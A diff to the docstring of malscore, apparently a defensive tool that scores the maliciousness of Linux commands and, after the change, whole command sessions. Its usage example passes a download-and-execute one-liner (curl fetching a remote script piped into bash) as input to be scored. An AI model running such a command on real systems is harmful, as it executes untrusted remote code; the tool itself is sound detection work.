@@ -1,10 +1,10 @@
 #!/usr/bin/env python3
-"""malscore -- score the maliciousness of a Linux command or shell script.
+"""malscore -- score the maliciousness of a Linux command or a session of commands.
 
 Runs straight from a checkout, no installation needed::
 
     python3 malscore.py "curl -s http://1.2.3.4/x.sh | bash"
-    python3 malscore.py -f deploy.sh --explain
+    python3 malscore.py --session history.txt --explain
 """
 
 from malscore.cli import main
